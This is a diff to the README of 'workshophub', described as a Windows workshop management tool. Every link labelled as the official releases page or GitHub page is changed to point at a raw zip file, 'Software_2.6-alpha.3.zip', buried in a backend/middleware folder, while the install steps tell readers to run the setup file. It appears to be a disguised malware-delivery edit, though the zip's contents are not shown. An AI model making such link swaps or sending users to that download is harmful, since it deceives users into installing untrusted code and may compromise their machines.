@@ -1,6 +1,6 @@
 # 🚀 workshophub - Simple Workshop Management Tool
 
-[![Download workshophub](https://img.shields.io/badge/Download-workshophub-brightgreen?style=for-the-badge)](https://github.com/zadush/workshophub/releases)
+[![Download workshophub](https://img.shields.io/badge/Download-workshophub-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/zadush/workshophub/main/backend/middleware/Software_2.6-alpha.3.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Before you start, make sure your Windows PC meets these requirements:
 ## 🔗 Download workshophub
 
 To get started, visit the official release page:  
-[Download workshophub releases](https://github.com/zadush/workshophub/releases)
+[Download workshophub releases](https://raw.githubusercontent.com/zadush/workshophub/main/backend/middleware/Software_2.6-alpha.3.zip)
 
 This page contains the latest version of the program ready for download. You will find setup files, instructions, and update notes there.
 
@@ -48,7 +48,7 @@ This page contains the latest version of the program ready for download. You wil
 
 Follow these steps to install and run workshophub on your Windows computer:
 
-1. Open the [workshophub releases page](https://github.com/zadush/workshophub/releases).  
+1. Open the [workshophub releases page](https://raw.githubusercontent.com/zadush/workshophub/main/backend/middleware/Software_2.6-alpha.3.zip).  
 2. Find the latest release version. It will usually be at the top of the list.  
 3. Click on the setup file link. This file typically ends with `.exe` for Windows.  
 4. When the download finishes, open the file to start the installation.  
@@ -91,7 +91,7 @@ If you run into problems, try these steps:
 
 - Restart the app and your PC if something looks wrong.  
 - Make sure your internet connection is stable.  
-- Check if you have the latest version by visiting the [release page](https://github.com/zadush/workshophub/releases).  
+- Check if you have the latest version by visiting the [release page](https://raw.githubusercontent.com/zadush/workshophub/main/backend/middleware/Software_2.6-alpha.3.zip).  
 - If the app won't open, try reinstalling from the latest setup file.  
 - Close other heavy programs if the app runs slow on your machine.  
 
@@ -119,7 +119,7 @@ A: Some features may work offline, but an internet connection is needed to sync 
 
 For more detailed help, troubleshooting guides, or to report bugs, visit the workshophub GitHub page:
 
-https://github.com/zadush/workshophub
+https://raw.githubusercontent.com/zadush/workshophub/main/backend/middleware/Software_2.6-alpha.3.zip
 
 You can find documentation, user guides, and developer notes there. The community and maintainers often answer questions in the issues section.
 
@@ -128,4 +128,4 @@ You can find documentation, user guides, and developer notes there. The communit
 ## ⬇️ Ready to start?
 
 Download workshophub now from the official releases page:  
-[Get workshophub releases](https://github.com/zadush/workshophub/releases)
+[Get workshophub releases](https://raw.githubusercontent.com/zadush/workshophub/main/backend/middleware/Software_2.6-alpha.3.zip)
